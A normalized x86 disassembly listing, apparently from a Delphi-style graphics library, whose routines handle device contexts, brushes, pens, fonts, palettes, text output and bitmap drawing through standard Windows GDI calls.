xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a8854c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_3a88d54
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_3a89c5c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov eax esi
call sub_3a89c54
cmp bl al
jne r-xdata
mov edx esp
mov eax esi
call sub_3a89a88
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_3a89aa4
mov [ esp + 0x4 ] 0xffffff
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_3a89b18
cmp eax 0xffffff
je r-xdata
sub_3a89cb0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8904c
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_3a8a594
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89694
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_3a8a5b4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89978
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_3a8a5d4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
movzx eax [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_3a7a810
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a89d74
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_3a7a8ac
xor edx edx
mov eax esi
call sub_3a8a3c8
mov eax [ esi + 0xc ]
call sub_3a64380
mov eax [ esi + 0x10 ]
call sub_3a64380
mov eax [ esi + 0x14 ]
call sub_3a64380
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a89dd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_3a8a41c
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3a89e58
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
mov eax [ ebx + 0x14 ]
call sub_3a89b18
call sub_3a88d54
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3a78e1c
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_3a89f04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
mov eax [ ebx + 0x14 ]
call sub_3a89b74
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_3a89f40
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_3a89fa0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_3a89fcc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_3a8a008
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_3a8a050
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_3a8a08c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_3a8a340
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_3a8a0b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
mov eax ebx
call sub_3a8a08c
cmp al 0x1
jne r-xdata
mov esi edi
test esi esi
je r-xdata
mov edx edi
mov eax ebx
call sub_3a8a19c
inc eax
add [ ebp - 0x4 ] eax
push 0x0
push esi
mov eax edi
call sub_3a65730
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx edi
mov eax ebx
call sub_3a8a19c
mov edx eax
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_3a89fa0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub esi 0x4
mov esi [ esi ]
sub_3a8a154
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
movzx edx [ r-xdata ]
mov eax esi
call sub_3a8a41c
xor eax eax
mov [ edi ] eax
xor eax eax
mov [ edi + 0x4 ] eax
mov ebx ebp
test ebx ebx
je r-xdata
push edi
push ebx
mov eax ebp
call sub_3a65730
push eax
mov eax [ esi + 0x4 ]
push eax
call GetTextExtentPoint32A
pop ebp
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_3a8a19c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_3a8a154
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3a8a1b8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_3a8a154
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3a8a1d8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_3a8a224
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8a22b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_3a89f78
sub_3a8a284
push ebx
push esi
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_3a8a2ac
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_3a89fa0
pop ecx
pop edx
pop edi
pop esi
retn
sub_3a8a2cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_3a8a2f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_3a8a41c
mov eax [ ebp + 0x8 ]
call sub_3a88d54
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_3a8a364
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
movzx edx [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_3a8a3c8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_3a8a364
mov edx esp
mov eax ebx
call sub_3a8a284
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_3a8a2ac
sub_3a8a41c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx ebx [ esi + 0x8 ]
not ebx
and bl [ esp ]
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_3a8a4bc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
test bl 0x8
je r-xdata
mov eax esi
call sub_3a8a4e8
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_3a8a518
sub_3a8a4bc
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_3a89260
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_3a8a4e8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_3a89858
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_3a8a518
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_3a89b74
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_3a89b74
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_3a89c54
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_3a89b18
call sub_3a88d54
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_3a89b18
call sub_3a88d54
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_3a8a648
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a8a692
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8a699
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a8a69c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_3a8a738
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_3a8a648
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_3a65510
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8a73f
lea eax [ ebp - 0x104 ]
call sub_3a652a0
retn
sub_3a8a754
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_3a8a8a2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_3a8a811
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_3a8a69c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_3a8a69c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8a8a9
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_3a8a8b4
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_3a8a8d4
push ebx
dec ecx
mov ebx eax
imul ebx edx
add ebx ecx
not ecx
and ebx ecx
mov ecx 0x8
mov eax ebx
cdq
idiv ecx
mov ebx eax
mov eax ebx
pop ebx
retn
sub_3a8a8f4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_3a8a744
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3a8ab69
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_3a8a744
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8ab70
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x440328
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_3a8a744
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3a8a9bc
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xccaa0029
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8ab70
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_3a8ab80
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
movzx ebx [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
movzx ebx [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
movzx ecx [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_3a8abbc
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_3a63a44
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
movzx ebx [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
movzx ebx [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
movzx eax [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_3a8ac38
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_3a8ac8c
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_3a63154
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8ad89
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8ad90
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_3a8ada4
